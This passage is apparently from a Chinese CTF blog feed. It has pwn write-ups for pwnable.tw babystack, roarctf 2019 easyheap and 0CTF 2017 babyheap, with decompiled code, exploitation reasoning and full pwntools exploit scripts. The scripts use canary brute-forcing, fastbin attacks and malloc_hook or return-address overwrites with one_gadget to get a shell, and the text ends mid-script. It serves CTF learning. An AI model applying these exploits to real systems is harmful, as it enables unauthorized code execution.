class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">copy</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Copy :"</span>);</span><br><span class="line">  sub_CA0((<span class="keyword">unsigned</span> __int8 *)&amp;src, <span class="number">0x3F</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(a1, &amp;src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"It is magic copy !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当is_login==1时，该函数会将当前栈上读入的数据strcpy到main函数的栈上。</p><p><strong>这里的漏洞点在于copy函数和login函数的栈空间相同，而login函数可以读入0x7f个字节，这在copy到main函数栈上时将会产生溢出。</strong></p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>1、利用strncmp爆破出canary的值</p><p>2、利用copy函数布置好栈空间，利用strncmpbaopo出libc的地址</p><p>3、因为strcpy会有’\x00’阶段，因此无法使用ROP，需要计算出one_gadget一发入魂</p><p>4、利用copy函数进行溢出并将返回地址覆盖成one_gadget</p><p>完整脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = ['tmux','split','-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = process("./babystack")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10205</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span></span><br><span class="line">libc = ELF(<span class="string">"libc_64.so.6"</span>)</span><br><span class="line">se = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(passwd)</span>:</span></span><br><span class="line">    se(<span class="string">"1"</span>)</span><br><span class="line">    s(<span class="string">"passowrd :"</span>,passwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    s(<span class="string">"&gt;&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy</span><span class="params">(cnt)</span>:</span></span><br><span class="line">    s(<span class="string">"&gt;&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line">    s(<span class="string">"Copy :"</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bf</span><span class="params">(length,s1 = <span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">10</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s2 = s1 + chr(i)</span><br><span class="line">            login(s2+<span class="string">'\x00'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Success"</span> <span class="keyword">in</span> p.recv():</span><br><span class="line">                s1 = s2</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+]found!"</span></span><br><span class="line">                logout()</span><br><span class="line">                sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(s2) == length:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(length,s1 = <span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">10</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s2 = s1 + chr(i)</span><br><span class="line">            login(<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'1'</span>+<span class="string">'a'</span>*<span class="number">0x7</span>+s2+<span class="string">'\x00'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Success"</span> <span class="keyword">in</span> p.recv():</span><br><span class="line">                s1 = s2</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+]found!"</span></span><br><span class="line">                logout()</span><br><span class="line">                sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(s2) == length:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line">magic = bf(<span class="number">16</span>)</span><br><span class="line">login(<span class="string">'\x00'</span>+<span class="string">'a'</span>*<span class="number">0x57</span>)</span><br><span class="line">copy(<span class="string">"b"</span>*<span class="number">0x20</span>)</span><br><span class="line">logout()</span><br><span class="line">base = leak(<span class="number">6</span>)</span><br><span class="line">libc_base = u64(base.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x6ffb4</span></span><br><span class="line">one = <span class="number">0xf0567</span> + libc_base</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">login(<span class="string">'\x00'</span>+<span class="string">'c'</span>*<span class="number">0x3f</span>+magic+<span class="string">'a'</span>*<span class="number">0x18</span>+p64(one))</span><br><span class="line">copy(<span class="string">"b"</span>*<span class="number">0x20</span>)</span><br><span class="line">se(<span class="string">"2"</span>)</span><br><span class="line"><span class="comment">#find /home -name flag | xargs cat</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img alt="" data-src="/2020/06/22/pwnable-tw-babystack/1.png" class="lazyload"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这是一道组合溢出的题目，与常见的栈溢出不同，故记录一下。&lt;/p&gt;
&lt;h3 id=&quot;程序分析&quot;&gt;&lt;a href=&quot;#程序分析&quot; class=&quot;
      
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
      <category term="pwnable.tw" scheme="https://j-kangel.github.io/tags/pwnable-tw/"/>
    
      <category term="stack" scheme="https://j-kangel.github.io/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>buuoj刷题记录之堆</title>
    <link href="https://j-kangel.github.io/2020/06/09/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8B%E5%A0%86/"/>
    <id>https://j-kangel.github.io/2020/06/09/buuoj刷题记录之堆/</id>
    <published>2020-06-09T14:42:47.000Z</published>
    <updated>2020-06-09T07:51:54.518Z</updated>
    
    <content type="html"><![CDATA[<h3 id="roarctf-2019-easyheap"><a href="#roarctf-2019-easyheap" class="headerlink" title="roarctf 2019 easyheap"></a>roarctf 2019 easyheap</h3><p>这道题涉及的利用的技巧主要是house of spirit和文件描述符重定向</p><h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h4><p>hos利用场景是<code>可写区域-不可写区域-可写区域</code>，这时可以利用堆中的漏洞进行hos而使中间的不可写区域变得可写。方法是通过伪造堆块使其加入bins中</p><h4 id="文件描述符重定向"><a href="#文件描述符重定向" class="headerlink" title="文件描述符重定向"></a>文件描述符重定向</h4><p>题目在后半部分关闭stdout和stderr，具体参考<a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a></p><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p>除了PIE，其他保护全开。功能如下：</p><ol><li>add：可以malloc申请不超过0x80的堆块</li><li>dele：free之后未清零，可以造成double free</li><li>show：需要中间<code>不可写区域</code>为特定值，使用后关闭stdout和stderr</li><li>secret：当功能号为666时，可以使用。可以calloc(0xA0)和free，也是没有清零。可以多次使用</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !qword_602010 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"everything has a price"</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7; <span class="comment">//仍然减少</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"build or free?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;v2, <span class="number">8u</span>LL) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v0 = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v2, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">calloc</span>(<span class="number">0xA0</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"please input your content"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, ptr, <span class="number">0xA0</span>uLL) &gt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"invaild choice"</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">  --qword_602010; <span class="comment">//当减至小于0时仍可使用</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是输入name和info，即两处可写区域</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000602060 unk_602060     #name,大小0x20</span><br><span class="line">.bss:0000000000602088 buf          </span><br><span class="line">.bss:0000000000602090 qword_602090   #需要为0xdeadbeefdeadbeef才能show                   </span><br><span class="line">.bss:0000000000602098 ; void *ptr</span><br><span class="line">.bss:00000000006020A0 unk_6020A0     #info，大小0x20</span><br></pre></td></tr></table></figure><p>思路如下：</p><p>在name和info处伪造好堆块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">sl(<span class="string">"name:"</span>,pay)</span><br><span class="line">sl(<span class="string">"info"</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>))</span><br></pre></td></tr></table></figure><p>利用double free造成fastbin attack将bss加入fastbinzhong</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">secret(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">secret(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">dele()</span><br><span class="line">secret(<span class="number">2</span>)</span><br><span class="line">dele()</span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0x602060</span>))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(elf.got[<span class="string">'exit'</span>])+p64(<span class="number">0xdeadbeefdeadbeef</span>))</span><br></pre></td></tr></table></figure><p>泄露libc，因为got表不可写，因此需要再次利用fastbin attack劫持malloc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dele2()</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">dele2()</span><br><span class="line">add2(<span class="number">0x68</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(realloc+<span class="number">0x14</span>))</span><br></pre></td></tr></table></figure><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./roarctf_2019_easyheap"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",28917)</span></span><br><span class="line">elf = ELF(<span class="string">"./roarctf_2019_easyheap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,cnt)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    sl(<span class="string">"size"</span>,str(size))</span><br><span class="line">    s(<span class="string">"content"</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,cnt)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.sendline(cnt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele2</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">(i)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt; "</span>,<span class="string">"666"</span>)</span><br><span class="line">    sl(<span class="string">"?"</span>,str(i))</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">        sl(<span class="string">"content"</span>,<span class="string">"kangel"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">sl(<span class="string">"name:"</span>,pay)</span><br><span class="line">sl(<span class="string">"info"</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x51</span>))</span><br><span class="line"><span class="comment"># add(0x40,'aaa')</span></span><br><span class="line">secret(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">secret(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">dele()</span><br><span class="line">secret(<span class="number">2</span>)</span><br><span class="line">dele()</span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0x602060</span>))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(elf.got[<span class="string">'exit'</span>])+p64(<span class="number">0xdeadbeefdeadbeef</span>))</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'exit'</span>]</span><br><span class="line">malloc_hook = libc.sym[<span class="string">'__malloc_hook'</span>] + libc_base</span><br><span class="line">realloc = libc.sym[<span class="string">'realloc'</span>] + libc_base</span><br><span class="line">one = libc_base +<span class="number">0xf1147</span><span class="comment"># 0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">dele2()</span><br><span class="line">p.sendline(<span class="string">"666"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">dele2()</span><br><span class="line">add2(<span class="number">0x68</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'bbb'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(realloc+<span class="number">0x14</span>))</span><br><span class="line"><span class="comment"># gd()</span></span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'exec 1&gt;&amp;0'</span>) <span class="comment">#将stdout重定向到stdin，即终端</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0CTF-2017-babyheap"><a href="#0CTF-2017-babyheap" class="headerlink" title="0CTF 2017 babyheap"></a>0CTF 2017 babyheap</h3><p>edit处存在堆溢出，因此可以overlapping打fastbin attack。add使用的是calloc，可以改写ismmap标志位从而泄露libc</p><h4 id="mmap的calloc分配不会memset"><a href="#mmap的calloc分配不会memset" class="headerlink" title="mmap的calloc分配不会memset"></a>mmap的calloc分配不会memset</h4><p>具体方法如下：</p><ol><li>申请largebin大小(0x500)的堆块并free，这时进入unsorted bin。</li><li>利用堆溢出是<code>ismmap = 1</code></li><li>申请更大(0x600)的堆块，unsorted bin中的堆块进入largebin</li><li>重新calloc申请(0x500)，不会memset</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#6</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x600</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x70</span>,<span class="number">0x68</span>*<span class="string">'b'</span>+p64(<span class="number">0x513</span>))</span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#7</span></span><br><span class="line">show(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>之后是常规的overlapping打fastbin attack，然后劫持malloc_hook。</p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./0ctf_2017_babyheap"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn",29087)</span></span><br><span class="line">elf = ELF(<span class="string">"./0ctf_2017_babyheap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    sl(<span 